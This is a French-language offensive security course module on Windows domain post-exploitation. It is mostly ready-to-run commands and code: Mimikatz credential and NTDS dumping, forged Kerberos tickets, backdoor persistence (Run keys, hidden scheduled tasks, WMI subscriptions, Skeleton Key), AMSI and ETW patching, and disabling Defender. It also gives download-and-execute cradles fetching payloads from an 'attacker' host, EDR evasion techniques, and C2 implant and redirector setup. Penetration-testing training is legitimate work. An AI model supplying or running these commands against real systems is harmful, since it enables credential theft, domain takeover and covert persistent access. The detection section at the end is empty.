---
tags:
  - formation
  - security
  - windows
  - hacking
  - post-exploitation
  - persistence
  - lateral-movement
  - mimikatz
---

# Module 5 : Post-Exploitation & Persistence

Après avoir compromis le domaine, l'objectif est de maintenir l'accès et de pivoter vers d'autres systèmes. Ce module couvre les techniques avancées de credential dumping, la création de tickets Kerberos forgés, les mécanismes de persistence, le mouvement latéral et l'évasion des défenses.

## Objectifs du Module

À la fin de ce module, vous serez capable de :

- Extraire des credentials avec Mimikatz en profondeur
- Créer et utiliser des Golden et Silver Tickets
- Établir des mécanismes de persistence discrets
- Réaliser du mouvement latéral avec différentes techniques
- Contourner les défenses (AMSI, Defender, ETW)

**Durée estimée :** 6.5 heures
**Niveau :** Avancé

---

## 1. Credential Dumping Avancé

### 1.1 Mimikatz en Profondeur

!!! info "Mimikatz - L'outil incontournable"
    Mimikatz reste l'outil de référence pour l'extraction de credentials Windows, malgré sa détection par tous les antivirus.

**Commandes essentielles :**

```powershell
# Démarrer Mimikatz
.\mimikatz.exe

# Activer les privilèges de debug
privilege::debug

# Élever vers SYSTEM
token::elevate

# Extraire les credentials des sessions actives
sekurlsa::logonpasswords

# Extraire les tickets Kerberos
sekurlsa::tickets /export

# Extraire les clés de chiffrement
sekurlsa::ekeys

# Extraire les credentials du cache
lsadump::cache

# Extraire la SAM
lsadump::sam

# DCSync (si droits suffisants)
lsadump::dcsync /user:Administrator
lsadump::dcsync /user:krbtgt
```

**One-liner Mimikatz :**

```powershell
# Exécution sans interaction
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Avec sortie fichier
.\mimikatz.exe "privilege::debug" "log output.txt" "sekurlsa::logonpasswords" "exit"
```

### 1.2 DPAPI Secrets

DPAPI (Data Protection API) protège les secrets utilisateur. Mimikatz peut les déchiffrer.

```powershell
# Lister les master keys
dpapi::masterkey /in:"C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-...\[GUID]" /rpc

# Déchiffrer avec le domain backup key (en tant que DA)
lsadump::backupkeys /export

# Déchiffrer les credentials Chrome
dpapi::chrome /in:"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Credentials du Credential Manager
vault::list
vault::cred
```

### 1.3 NTDS.dit Extraction

Le fichier NTDS.dit contient tous les hashes du domaine.

```powershell
# Méthode 1 : VSS (Volume Shadow Copy)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# Méthode 2 : ntdsutil
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q

# Méthode 3 : Mimikatz avec DCSync (plus discret)
lsadump::dcsync /all /csv
```

```bash
# Extraction des hashes (sur Kali)
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# Ou directement via le réseau
secretsdump.py yourcompany.local/Administrator:'Password123'@dc01.yourcompany.local
```

### 1.4 LSA Secrets

```powershell
# Avec Mimikatz
lsadump::secrets

# Secrets typiques :
# - Mots de passe de comptes de service
# - Credentials de tâches planifiées
# - Clés de chiffrement
# - DPAPI system keys
```

---

## 2. Ticket Forgery

### 2.1 Golden Ticket

**Concept :** Avec le hash du compte krbtgt, on peut forger n'importe quel TGT. Ce ticket est valide tant que le mot de passe krbtgt n'est pas changé (deux fois).

```mermaid
sequenceDiagram
    participant A as Attaquant
    participant DC as Domain Controller

    Note over A: Possède hash krbtgt
    A->>A: Forge TGT pour "Administrator"
    A->>DC: Présente Golden Ticket
    DC-->>A: Accès accordé (DA)
    Note over DC: Ne vérifie pas auprès de krbtgt<br/>car le TGT est auto-signé
```



**Prérequis :**

- Hash NTLM (ou clé AES) du compte krbtgt
- SID du domaine
- Nom de domaine

**Création avec Mimikatz :**

```powershell
# Récupérer le hash krbtgt (DCSync)
lsadump::dcsync /user:krbtgt

# Résultat :
# Hash NTLM : 1a2b3c4d5e6f...
# AES256 : abcd1234...

# Récupérer le SID du domaine
whoami /user
# ou
Get-ADDomain | Select-Object -ExpandProperty DomainSID

# Créer le Golden Ticket
kerberos::golden /user:FakeAdmin /domain:yourcompany.local /sid:S-1-5-21-1234567890-... /krbtgt:1a2b3c4d5e6f... /ptt

# Options additionnelles
# /id:500         - RID (500 = Administrator)
# /groups:512     - Domain Admins group
# /aes256:KEY     - Utiliser AES au lieu de RC4 (plus discret)
# /startoffset:-10 - Ticket valide depuis 10 min
# /endin:600      - Valide 600 min
# /renewmax:10080 - Renouvelable 7 jours
```

```bash
# Avec Impacket
ticketer.py -nthash 1a2b3c4d5e6f... -domain-sid S-1-5-21-1234567890-... -domain yourcompany.local Administrator

export KRB5CCNAME=Administrator.ccache
psexec.py yourcompany.local/Administrator@dc01.yourcompany.local -k -no-pass
```

### 2.2 Silver Ticket

**Concept :** Forger un TGS pour un service spécifique avec le hash du compte de service.

```powershell
# Silver Ticket pour accès CIFS (partages)
kerberos::golden /user:Administrator /domain:yourcompany.local /sid:S-1-5-21-... /target:srv01.yourcompany.local /service:cifs /rc4:HASH_MACHINE$ /ptt

# Silver Ticket pour WMI
kerberos::golden /user:Administrator /domain:yourcompany.local /sid:S-1-5-21-... /target:srv01.yourcompany.local /service:host /rc4:HASH /ptt

# Services courants :
# cifs    - Accès fichiers SMB
# http    - Web services
# host    - WMI, PSRemoting, Scheduled Tasks
# ldap    - LDAP queries
# mssql   - SQL Server
```

### 2.3 Diamond Ticket

**Concept :** Plus discret que le Golden Ticket. On demande un vrai TGT puis on le modifie pour changer l'utilisateur.

```powershell
# Avec Rubeus
.\Rubeus.exe diamond /krbkey:KRBTGT_AES256_KEY /user:FakeAdmin /enctype:aes /ticketuser:realuser /ticketuserid:1234 /groups:512 /ptt

# Le ticket résultant a un ticket-granting-ticket légitime
# mais les PAC (Privilege Attribute Certificate) sont modifiés
```

### 2.4 Sapphire Ticket

**Concept :** Encore plus discret. Utilise S4U2Self pour obtenir un ticket légitime puis modifie le PAC.

```bash
# Avec Impacket
ticketer.py -request -user Administrator -domain yourcompany.local -password 'P@ssw0rd' -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -dc-ip 192.168.56.10 FakeAdmin
```

---

## 3. Mécanismes de Persistence

### 3.1 Registry Persistence

```powershell
# Run keys - Exécution au démarrage utilisateur
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\backdoor.exe"
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\backdoor.exe"

# RunOnce - Exécution unique au prochain démarrage
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\temp\backdoor.exe"

# Winlogon - Exécution à chaque logon
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe,C:\temp\backdoor.exe"
```

### 3.2 Scheduled Tasks

```powershell
# Créer une tâche planifiée
schtasks /create /tn "WindowsUpdate" /tr "C:\temp\backdoor.exe" /sc onlogon /ru SYSTEM

# Tâche qui s'exécute toutes les heures
schtasks /create /tn "SystemCheck" /tr "powershell -ep bypass -w hidden -c IEX(cmd)" /sc hourly /ru SYSTEM

# Avec PowerShell (plus de contrôle)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -w hidden -file C:\temp\script.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM"
```

### 3.3 WMI Event Subscriptions

Persistence plus discrète via WMI.

```powershell
# Créer un event filter (déclencheur)
$FilterArgs = @{
    Name = 'BackdoorFilter'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

# Créer un consumer (action)
$ConsumerArgs = @{
    Name = 'BackdoorConsumer'
    CommandLineTemplate = "C:\temp\backdoor.exe"
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

# Lier filter et consumer
$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

### 3.4 DLL Search Order Hijacking

```powershell
# Identifier une DLL manquante chargée par un service système
# Placer notre DLL dans un répertoire prioritaire

# Exemple : wlbsctrl.dll pour le service IKEEXT
# Copier la DLL malveillante dans C:\Windows\System32\
```

### 3.5 Domain Persistence

**AdminSDHolder Abuse :**

```powershell
# L'objet AdminSDHolder définit les ACLs des groupes protégés
# Modifier ses ACLs = persistence dans 60 minutes sur tous les comptes protégés

# Ajouter GenericAll pour notre utilisateur sur AdminSDHolder
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=yourcompany,DC=local' -PrincipalIdentity attacker -Rights All

# Après 60 min (ou forcer avec SDProp), on a GenericAll sur Domain Admins
```

**DSRM Backdoor :**

```powershell
# Le compte DSRM est un compte admin local sur le DC
# Son hash est dans le registre

# Activer l'authentification DSRM sur le réseau
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2

# Se connecter avec le hash DSRM (extrait lors du DCSync)
sekurlsa::pth /user:Administrator /domain:DC01 /ntlm:DSRM_HASH
```

**Skeleton Key :**

```powershell
# Injecte un "mot de passe maître" dans LSASS sur le DC
# Tous les utilisateurs peuvent s'authentifier avec ce mot de passe

# Avec Mimikatz (en tant que SYSTEM sur le DC)
misc::skeleton

# Mot de passe par défaut : mimikatz
# Tester : runas /user:yourcompany\anyuser cmd
# Mot de passe : mimikatz
```

**Custom SSP :**

```powershell
# Charger une SSP malveillante qui log les credentials en clair

# Avec Mimikatz
misc::memssp

# Les credentials sont loggés dans C:\Windows\System32\mimilsa.log
```

---

## 4. Lateral Movement

### 4.1 PsExec et variantes

```bash
# PsExec classique (Impacket)
psexec.py yourcompany.local/Administrator:'Password'@192.168.56.10

# Avec hash
psexec.py yourcompany.local/Administrator@192.168.56.10 -hashes :HASH

# SMBExec (pas de service créé)
smbexec.py yourcompany.local/Administrator:'Password'@192.168.56.10

# WMIExec (via WMI)
wmiexec.py yourcompany.local/Administrator:'Password'@192.168.56.10

# ATExec (via Task Scheduler)
atexec.py yourcompany.local/Administrator:'Password'@192.168.56.10 "whoami"
```

### 4.2 WinRM / PSRemoting

```powershell
# PowerShell Remoting
Enter-PSSession -ComputerName SRV01 -Credential (Get-Credential)

# Exécuter une commande
Invoke-Command -ComputerName SRV01 -ScriptBlock { whoami } -Credential (Get-Credential)

# Session persistante
$session = New-PSSession -ComputerName SRV01 -Credential (Get-Credential)
Invoke-Command -Session $session -ScriptBlock { Get-Process }
```

```bash
# Evil-WinRM (depuis Linux)
evil-winrm -i 192.168.56.10 -u Administrator -p 'Password'

# Avec hash
evil-winrm -i 192.168.56.10 -u Administrator -H HASH

# Avec Kerberos
evil-winrm -i srv01.yourcompany.local -r yourcompany.local
```

### 4.3 DCOM Exploitation

```powershell
# MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.56.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","Minimized")

# ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","192.168.56.10"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","","open",0)
```

### 4.4 RDP Hijacking

Si une session RDP est déjà ouverte (même déconnectée), on peut la "voler" en tant que SYSTEM.

```powershell
# Lister les sessions
query user

# Résultat :
# USERNAME      SESSIONNAME   ID  STATE
# administrator             1  Disc

# Hijack la session (en tant que SYSTEM)
tscon 1 /dest:console

# Avec PsExec pour obtenir SYSTEM d'abord
PsExec.exe -s -i cmd
tscon 1 /dest:console
```

### 4.5 Pass-the-Certificate

```bash
# Si on a un certificat utilisateur (via ADCS exploitation)
certipy auth -pfx user.pfx -dc-ip 192.168.56.10

# Résultat : hash NTLM de l'utilisateur
# Puis Pass-the-Hash
```

---

## 5. Defense Evasion

### 5.1 AMSI Bypass

AMSI (Antimalware Scan Interface) scanne les scripts PowerShell en mémoire.

```powershell
# Bypass classique (patching en mémoire)
$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# One-liner obfusqué
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

# Avec réflection
$a = 'System.Management.Automation.A]'+']m]si]Ut]il]s'.Replace(']','')
$b = [Ref].Assembly.GetType($a)
$c = $b.GetField('am'+'siIn'+'itFailed','NonPublic,Static')
$c.SetValue($null,$true)
```

### 5.2 Defender Exclusions

```powershell
# Ajouter des exclusions (requiert admin)
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionProcess "mimikatz.exe"
Add-MpPreference -ExclusionExtension ".ps1"

# Désactiver la protection en temps réel (temporairement)
Set-MpPreference -DisableRealtimeMonitoring $true

# Désactiver Defender complètement (avec TrustedInstaller)
# Via GPO ou politique locale
```

### 5.3 ETW Bypass

Event Tracing for Windows permet de monitorer PowerShell. Le bypass empêche le logging.

```powershell
# Patch ETW
$a = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$b = $a.GetField('etwProvider','NonPublic,Static')
$c = $b.GetValue($null)
$d = $c.GetType().GetField('m_enabled','NonPublic,Instance')
$d.SetValue($c,0)
```

### 5.4 LOLBins (Living off the Land Binaries)

Utiliser des binaires Windows légitimes pour éviter la détection.

| Binary | Usage offensif |
|--------|----------------|
| certutil | Télécharger des fichiers |
| bitsadmin | Télécharger des fichiers |
| mshta | Exécuter HTA/VBS |
| msiexec | Exécuter MSI malveillant |
| rundll32 | Exécuter DLL |
| regsvr32 | Exécuter SCT |
| cscript/wscript | Exécuter VBS/JS |
| powershell | Tout... |

```powershell
# Télécharger avec certutil
certutil -urlcache -split -f http://attacker/payload.exe payload.exe

# Exécuter depuis URL avec mshta
mshta http://attacker/payload.hta

# Télécharger avec bitsadmin
bitsadmin /transfer job /download /priority high http://attacker/payload.exe C:\temp\payload.exe

# Exécuter DLL avec rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -w hidden -c IEX(cmd)");
```

### 5.5 Obfuscation PowerShell

```powershell
# Invoke-Obfuscation
Invoke-Obfuscation
SET SCRIPTPATH C:\temp\payload.ps1
ENCODING
1  # Base64

# Exemple manuel
$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded
```

### 5.6 EDR Evasion Avancé

Les solutions EDR (Endpoint Detection & Response) modernes utilisent plusieurs mécanismes de détection qu'il faut comprendre pour les contourner.

#### Architecture EDR


**Mécanismes de détection EDR :**

| Mécanisme | Description | Niveau |
|-----------|-------------|--------|
| **API Hooking** | Interception des appels ntdll.dll | User Mode |
| **ETW (Event Tracing)** | Logging des événements système | User Mode |
| **Kernel Callbacks** | Notification d'événements noyau | Kernel Mode |
| **Minifilter Drivers** | Interception I/O fichiers | Kernel Mode |
| **Memory Scanning** | Analyse de la mémoire des processus | User Mode |
| **Behavioral Analysis** | Détection de patterns suspects | Cloud/Local |

#### Unhooking ntdll.dll

Les EDR placent des hooks dans ntdll.dll pour intercepter les appels système. On peut restaurer la version originale.

```csharp
// Concept: Charger une copie propre de ntdll depuis le disque
// et remplacer la section .text hookée

// 1. Mapper ntdll.dll depuis le disque (copie propre)
IntPtr pModule = LoadLibrary("C:\\Windows\\System32\\ntdll.dll");

// 2. Localiser la section .text
// 3. Copier la section propre sur la version hookée en mémoire
// 4. Les hooks EDR sont supprimés

// Outils:
// - SharpUnhooker
// - DInjector (unhook module)
// - Syscall via Hell's Gate/Halo's Gate
```

**Avec un outil :**

```powershell
# SharpUnhooker - Restaure ntdll.dll
.\SharpUnhooker.exe

# Vérifier les hooks avant/après
.\HookDetector.exe
```

#### Direct Syscalls

Au lieu d'appeler ntdll.dll (hookée), on peut appeler directement le noyau via les syscalls.

```csharp
// Méthode traditionnelle (hookable):
// NtAllocateVirtualMemory() dans ntdll.dll → EDR intercepte

// Direct Syscall (évite les hooks):
// mov r10, rcx
// mov eax, [syscall_number]  // Ex: 0x18 pour NtAllocateVirtualMemory
// syscall
// ret

// Le numéro de syscall varie selon la version Windows!
```

**Techniques populaires :**

| Technique | Description |
|-----------|-------------|
| **Hell's Gate** | Résolution dynamique des syscall numbers |
| **Halo's Gate** | Variante qui gère les hooks EDR |
| **Tartarus' Gate** | Combinaison des deux |
| **SysWhispers** | Génération de stubs syscall |

```bash
# Générer des stubs syscall avec SysWhispers
python3 syswhispers.py --functions NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls

# Résultat: fichiers .h et .asm à inclure dans votre projet
```

#### Indirect Syscalls

Variante des direct syscalls qui exécute le `syscall` depuis ntdll.dll pour éviter la détection de syscalls dans des régions mémoire non-ntdll.

```
// Direct Syscall:
// Code dans notre .exe → syscall instruction → détecté car pas dans ntdll

// Indirect Syscall:
// Code dans notre .exe → JMP vers ntdll → syscall instruction dans ntdll → légitime
```

#### Process Injection Avancé

**Techniques classiques (détectées) :**

- CreateRemoteThread
- NtQueueApcThread
- SetThreadContext

**Techniques avancées :**

```csharp
// Module Stomping
// Charger une DLL légitime, écraser son code avec notre payload
// Le code malveillant semble venir d'une DLL signée Microsoft

// Process Hollowing
// Créer un processus suspendu, vider sa mémoire, injecter notre code
// Le processus semble légitime (ex: svchost.exe)

// Transacted Hollowing
// Utilise les transactions NTFS pour éviter la détection

// Early Bird Injection
// Injection avant l'initialisation du processus (avant hooks EDR)
```

**Process Injection avec D/Invoke :**

```csharp
// D/Invoke: Alternative à P/Invoke qui évite les hooks
// Au lieu d'importer statiquement, résout dynamiquement

// P/Invoke classique (hookable):
[DllImport("kernel32.dll")]
static extern IntPtr VirtualAlloc(...);

// D/Invoke (évite le hook):
IntPtr pointer = Generic.GetLibraryAddress("kernel32.dll", "VirtualAlloc");
// Appel via le pointer, pas via l'import
```

#### Sleep Obfuscation

Les EDR scannent la mémoire des processus. En chiffrant le payload pendant le sleep, on évite la détection.

```csharp
// Concept:
// 1. Avant sleep: Chiffrer le payload en mémoire (XOR, AES)
// 2. Pendant sleep: Mémoire contient uniquement du bruit chiffré
// 3. Après sleep: Déchiffrer et reprendre l'exécution

// Techniques:
// - Ekko: Utilise timers pour le chiffrement
// - Foliage: Variante avec ROP
// - Gargoyle: Utilise ROP + timers
```

**Implémentation dans Havoc/Sliver :**

```bash
# Havoc - Sleep obfuscation activé par défaut dans Demon
# Sliver - Option --evasion

sliver > generate --mtls 192.168.56.100 --os windows --evasion
```

#### PPID Spoofing

Modifier le processus parent pour paraître légitime.

```powershell
# Word.exe qui spawn powershell.exe = suspect
# svchost.exe qui spawn powershell.exe = moins suspect (mais toujours)

# PPID Spoofing: créer powershell.exe avec svchost.exe comme "parent"
```

```csharp
// Via STARTUPINFOEX et PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
var si = new STARTUPINFOEX();
si.lpAttributeList = ... // Définir le PPID spoofé
CreateProcess(..., si, ...);
```

#### Contournement ETW

```csharp
// ETW: Event Tracing for Windows
// Utilisé par les EDR pour logger PowerShell, .NET, etc.

// Patch en mémoire de EtwEventWrite
// 1. Localiser ntdll!EtwEventWrite
// 2. Patcher avec "ret" (0xC3) au début
// 3. Toutes les traces ETW sont ignorées

IntPtr addr = GetProcAddress(GetModuleHandle("ntdll"), "EtwEventWrite");
VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, out _);
Marshal.WriteByte(addr, 0xC3); // ret
```

```powershell
# Patch ETW via PowerShell (simplifié)
$etw = [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance')
# ... patch similar to AMSI
```

#### Outils d'Évasion EDR

| Outil | Description |
|-------|-------------|
| **ScareCrow** | Génération de loaders avec évasion EDR |
| **Freeze** | Suspension des threads EDR |
| **SharpBlock** | Blocage des DLLs EDR |
| **NimPackt** | Implants Nim avec évasion |
| **Mangle** | Manipulation de PE pour évasion |
| **PEzor** | Packer avec shellcode loader |

**Exemple ScareCrow :**

```bash
# Générer un loader avec évasion
ScareCrow -I payload.bin -domain microsoft.com -Loader binary -O output.exe

# Options:
# -domain: Domain fronting pour les callbacks
# -Loader: Type de loader (binary, dll, msiexec)
# -sandbox: Détection de sandbox
```

#### Détection de Sandbox/VM

```csharp
// Checks anti-analyse:
// - Nom d'utilisateur (john, malware, sandbox)
// - Nom de machine (DESKTOP-XXXXXX patterns)
// - Processus (vmtoolsd, vboxservice)
// - Fichiers (C:\windows\system32\drivers\vmmouse.sys)
// - Registry (HKLM\SOFTWARE\VMware)
// - CPU count < 2
// - RAM < 4GB
// - Temps d'exécution (fast forward detection)
// - Interaction utilisateur (mouvements souris)

if (Environment.UserName.ToLower().Contains("malware"))
    Environment.Exit(0);

if (Environment.ProcessorCount < 2)
    Environment.Exit(0);
```

#### Résumé EDR Evasion

```mermaid
flowchart LR
    subgraph techniques["Techniques d'Évasion"]
        T1[Unhooking]
        T2[Direct Syscalls]
        T3[Sleep Obfuscation]
        T4[PPID Spoofing]
        T5[ETW Bypass]
    end

    subgraph detection["Mécanismes Détectés"]
        D1[API Hooks]
        D2[Syscall Monitoring]
        D3[Memory Scanning]
        D4[Process Tree]
        D5[Event Logging]
    end

    T1 -.->|"Bypasses"| D1
    T2 -.->|"Bypasses"| D1
    T3 -.->|"Bypasses"| D3
    T4 -.->|"Bypasses"| D4
    T5 -.->|"Bypasses"| D5

    style T1 fill:#27ae60,color:#fff
    style T2 fill:#27ae60,color:#fff
    style T3 fill:#27ae60,color:#fff
    style T4 fill:#27ae60,color:#fff
    style T5 fill:#27ae60,color:#fff
```



!!! warning "Avertissement Légal"
    Ces techniques sont présentées à des fins éducatives pour comprendre les mécanismes de défense. Leur utilisation sans autorisation explicite est illégale.

---

## 6. Command & Control (C2) Frameworks

Les C2 frameworks permettent de gérer les machines compromises de manière centralisée, avec des fonctionnalités avancées de post-exploitation, d'évasion et de pivoting.

### 6.1 Pourquoi un C2 ?


| Fonctionnalité | Description |
|----------------|-------------|
| **Gestion centralisée** | Un seul point de contrôle pour tous les implants |
| **Communications chiffrées** | HTTPS, DNS, SMB named pipes |
| **Évasion intégrée** | Malleable profiles, sleep jitter, process injection |
| **Post-exploitation** | Modules intégrés (mimikatz, screenshot, keylogger) |
| **Pivoting** | Tunnels SOCKS, port forwarding |
| **Collaboration** | Multi-opérateurs, logs partagés |

### 6.2 Sliver - C2 Open Source Moderne

!!! info "Sliver par BishopFox"
    [Sliver](https://github.com/BishopFox/sliver) est un C2 framework open-source moderne, écrit en Go, avec support multi-plateformes.

**Installation :**

```bash
# Installation rapide (Linux)
curl https://sliver.sh/install | sudo bash

# Ou avec Docker
docker run -it -v ~/.sliver:/root/.sliver bishopfox/sliver

# Démarrer le serveur
sliver-server
```

**Génération d'implants :**

```bash
# Implant interactif (session)
sliver > generate --mtls 192.168.56.100 --os windows --arch amd64 --save /tmp/

# Implant beacon (asynchrone)
sliver > generate beacon --mtls 192.168.56.100 --os windows --seconds 60 --jitter 30 --save /tmp/

# Implant avec évasion
sliver > generate --mtls 192.168.56.100 --os windows --evasion

# Options avancées
sliver > generate --mtls 192.168.56.100 \
    --os windows \
    --arch amd64 \
    --format exe \
    --name windows-update \
    --debug
```

**Configuration des listeners :**

```bash
# Listener MTLS (recommandé)
sliver > mtls --lhost 0.0.0.0 --lport 8888

# Listener HTTPS
sliver > https --domain legit-domain.com --lport 443

# Listener DNS (plus discret)
sliver > dns --domains c2.attacker.com --no-response

# Listener sur named pipe (pivoting)
sliver > pivots named-pipe --bind \\.\\pipe\\slack_rpc
```

**Post-exploitation avec Sliver :**

```bash
# Lister les sessions/beacons actifs
sliver > sessions
sliver > beacons

# Interagir avec une session
sliver > use [SESSION_ID]

# Commandes de base
sliver (WINDOWS-PC) > whoami
sliver (WINDOWS-PC) > pwd
sliver (WINDOWS-PC) > ls
sliver (WINDOWS-PC) > cat C:\\Users\\admin\\Desktop\\flag.txt

# Upload/Download
sliver (WINDOWS-PC) > upload /tmp/mimikatz.exe C:\\temp\\mimi.exe
sliver (WINDOWS-PC) > download C:\\Users\\admin\\Documents\\secret.docx

# Exécuter des commandes
sliver (WINDOWS-PC) > execute -o -- cmd.exe /c "net user"
sliver (WINDOWS-PC) > shell  # Interactive shell

# Screenshot
sliver (WINDOWS-PC) > screenshot

# Process listing
sliver (WINDOWS-PC) > ps
sliver (WINDOWS-PC) > procdump -p 1234 -s /tmp/dump.dmp

# Injection de processus
sliver (WINDOWS-PC) > migrate -p 4567  # PID of target process

# Pivoting SOCKS5
sliver (WINDOWS-PC) > socks5 start
# Utiliser proxychains avec 127.0.0.1:1080
```

**Extensions Sliver (BOF/COFF) :**

```bash
# Charger des extensions
sliver > armory install rubeus
sliver > armory install seatbelt
sliver > armory install sharpwmi

# Utiliser les extensions
sliver (WINDOWS-PC) > rubeus kerberoast
sliver (WINDOWS-PC) > seatbelt -- -group=all
```

### 6.3 Havoc - C2 Moderne avec UI

!!! info "Havoc Framework"
    [Havoc](https://github.com/HavocFramework/Havoc) est un C2 moderne avec interface graphique Qt, inspiré de Cobalt Strike mais open-source.

**Installation :**

```bash
# Cloner le repo
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# Build le teamserver
cd teamserver
go build -o havoc-teamserver cmd/server/main.go

# Build le client
cd ../client
make

# Configuration
cat > profiles/havoc.yaotl << 'EOF'
Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "hacker" {
        Password = "SuperSecure123!"
    }
}

Listeners {
    Http {
        Name         = "HTTP Listener"
        Hosts        = ["192.168.56.100"]
        HostBind     = "0.0.0.0"
        PortBind     = 80
        PortConn     = 80
        Secure       = false
        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64)"
    }
}
EOF

# Démarrer
./havoc-teamserver --profile profiles/havoc.yaotl
./havoc-client
```

**Fonctionnalités principales :**

| Feature | Description |
|---------|-------------|
| **Demon Agent** | Implant optimisé avec évasion intégrée |
| **Sleep Obfuscation** | Chiffrement en mémoire pendant le sleep |
| **Indirect Syscalls** | Évite les hooks EDR |
| **BOF Support** | Beacon Object Files compatibles |
| **Interactive UI** | Interface graphique complète |
| **Token Manipulation** | Impersonation intégrée |

**Génération d'agents Demon :**

```
# Via l'interface graphique:
1. Attack > Payload > Demon
2. Configurer :
   - Listener: HTTP Listener
   - Format: Windows Exe
   - Arch: x64
   - Indirect Syscalls: Enabled
   - Sleep Technique: Obfuscate
3. Generate
```

### 6.4 Comparatif des C2

| Feature | Sliver | Havoc | Cobalt Strike | Mythic |
|---------|--------|-------|---------------|--------|
| **Open Source** | ✅ | ✅ | ❌ ($5,900/an) | ✅ |
| **Interface** | CLI | GUI | GUI | Web |
| **Langage** | Go | C/C++ | Java | Python/Go |
| **Multi-OS** | ✅ | Windows focus | ✅ | ✅ |
| **DNS C2** | ✅ | ❌ | ✅ | ✅ |
| **BOF/COFF** | ✅ | ✅ | ✅ | Via plugins |
| **Sleep Evasion** | Basic | Advanced | Advanced | Varies |
| **Documentation** | Excellent | Good | Excellent | Good |
| **Communauté** | Active | Growing | Large | Active |

### 6.5 OpSec C2 - Bonnes Pratiques

!!! danger "Règles d'OpSec pour les C2"

    1. **Redirecteurs** : Ne jamais exposer le C2 directement
    2. **Chiffrement** : Toujours utiliser TLS/HTTPS
    3. **Domain Fronting** : Utiliser des CDN pour masquer le trafic
    4. **Jitter** : Randomiser les intervalles de beacon
    5. **Sleep Long** : Préférer des intervalles longs (>30 min) en production
    6. **Process Injection** : Migrer vers des processus légitimes
    7. **Named Pipes** : Utiliser pour le mouvement latéral interne

**Architecture avec redirecteur :**


**Configuration Nginx redirecteur :**

```nginx
# /etc/nginx/sites-available/c2-redirector
server {
    listen 443 ssl;
    server_name legit-domain.com;

    ssl_certificate /etc/ssl/certs/fullchain.pem;
    ssl_certificate_key /etc/ssl/private/privkey.pem;

    # Uniquement si User-Agent attendu
    location / {
        if ($http_user_agent !~ "Mozilla/5.0.*Windows NT 10.0") {
            return 404;
        }

        proxy_pass https://c2-internal.attacker.local:8443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

### 6.6 Détection des C2

